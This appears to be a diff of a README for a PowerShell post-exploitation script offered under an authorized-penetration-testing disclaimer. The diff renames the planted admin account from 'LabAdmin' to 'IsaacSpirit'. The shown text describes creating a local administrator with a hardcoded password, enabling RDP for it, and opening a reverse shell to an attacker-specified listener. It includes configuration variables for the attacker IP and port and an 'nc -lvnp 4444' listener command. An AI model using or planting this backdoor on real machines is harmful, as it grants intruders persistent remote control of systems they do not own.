@@ -6,7 +6,7 @@ This code is provided **exclusively for authorized penetration testing, educatio
 ## What This Script Does
 When executed with administrative privileges, this PowerShell script will:
 
-1. **Create a local administrator account** (`LabAdmin` / `P@ssw0rd123!`).  
+1. **Create a local administrator account** (`IsaacSpirit` / `P@ssw0rd123!`).  
 2. **Add that account to the Remote Desktop Users group** and enable RDP (if disabled).  
 3. **Establish a C2 (reverse shell) connection** back to a listener you specify (IP/port).  
 
@@ -22,7 +22,7 @@ You can change the username, password, IP, and port before running.
 # ============================================================
 
 # -------- CONFIGURATION (EDIT THESE) --------
-$AdminUser   = "LabAdmin"
+$AdminUser   = "IsaacSpirit"
 $AdminPass   = "P@ssw0rd123!"
 $ListenerIP  = "192.168.1.100"   # Your attacker machine IP
 $ListenerPort = 4444             # Your listener port
@@ -106,7 +106,7 @@ nc -lvnp 4444
   ```
 
 ### 3. Verify
-- The local admin account `LabAdmin` will be created.
+- The local admin account `IsaacSpirit` will be created.
 - RDP will be enabled; you can log in remotely using that account.
 - A reverse shell will connect back to your listener – you should see a PowerShell prompt in your netcat session.
 
